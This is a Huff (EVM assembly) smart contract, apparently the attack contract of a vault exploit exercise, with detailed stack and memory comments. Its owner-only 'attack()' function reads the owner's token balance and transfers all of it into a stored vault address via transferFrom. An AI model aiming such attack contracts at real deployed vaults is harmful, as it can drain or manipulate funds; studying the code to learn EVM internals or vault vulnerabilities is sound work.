// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant VAULT_SLOT = FREE_STORAGE_POINTER() 
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address (1st constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    dup2            // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address (2nd constructor arg)

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [vault] - copied vault onto stack from byte offset 0x00 in mem
    [VAULT_SLOT]    // [0x01, vault] - storage slot where to store vault
    sstore          // [] - copied vault to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address (1st constructor arg)

    0x20            // [0x20] - byte offset in memory
    mload           // [token] - copied token onto stack from byte offset 0x20 in mem
    [TOKEN_SLOT]    // [0x02] - storage slot where token will be copied to 
    sstore          // [] - copied token to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address (2nd constructor arg)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `balanceOf(address)` func sig and owner into mem to use as calldata for STATICCALL
    0x70a08231      // [0x70a08231] - func sig
    0x00            // [0x00, 0x70a08231] - byte offset in mem
    mstore          // [] - copied func sig into memory at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig

    caller          // [owner] - msg.sender is owner due to modifier
    0x20            // [0x20, owner] - byte offset in mem
    mstore          // [] - copied owner into memory at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy vault into mem to use as calldata for future CALL
    [VAULT_SLOT]         // [0x01] - storage slot where vault is
    sload           // [vault] - copied vault onto stack from storage slot 0x01
    0x40            // [0x40, vault] - byte offset in mem
    mstore          // [] - copied vault into mem at offset 0x40

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x40]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address

    // STATICCALL into token
    [TOKEN_SLOT]         // [0x02] - storage slot where token is
    sload           // [token] - copied token onto stack from storage slot 0x02
    0x20            // [0x20, token] - size of return data (uint256)
    0x60            // [0x60, 0x20, token] - byte offset in mem where return data is copied
    0x24            // [0x24, 0x60, 0x20, token] - size of calldata
    0x1c            // [0x1c, 0x24, 0x60, 0x20, token] - byte offset in mem where calldata starts
    dup5            // [token, 0x1c, 0x24, 0x60, 0x20, token] - calling token
    gas             // [gas, token, 0x1c, 0x24, 0x60, 0x20, token] - gas to send with staticcall (gasleft())
    staticcall      // [success, token] - consumes 6 items and pushes 1 if call is successful, 0 otherwise
    iszero          // [0/1, token]
    throw_error     // [throw_error, 0/1, token]
    jumpi           // [token]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x40]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000008ac7230489e80000 -> balance of owner (uint256)

    // Copy `transferFrom(address,address,uint256)` func sig into mem to use as calldata for CALL
    0x23b872dd      // [0x23b872dd, token] - func sig
    0x00            // [0x00, 0x23b872dd, token] - byte offset in mem
    mstore          // [token] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000023b872dd -> `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x20]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x40]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> vault address
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000008ac7230489e80000 -> balance of owner (uint256)

    // CALL into token
    0x00            // [0x00, token] - size of return data (don't care)
    0x00            // [0x00, 0x00, token] - byte offset in mem where return data is copied
    0x64            // [0x64, 0x00, 0x00, token] - size of calldata
    0x1c            // [0x1c, 0x64, 0x00, 0x00, token] - byte offset in mem where calldata starts
    0x00            // [0x00, 0x1c, 0x64, 0x00, 0x00, token] - msg.value to send with call (none)
    dup6            // [token, 0x00, 0x1c, 0x64, 0x00, 0x00, token] - calling token
    gas             // [gas, token, 0x00, 0x1c, 0x64, 0x00, 0x00, token] - gas to send with call (gasleft())
    call            // [success, token] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero          // [0/1, token]
    throw_error     // [throw_error, 0/1, token]
    jumpi           // [token]
    pop             // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
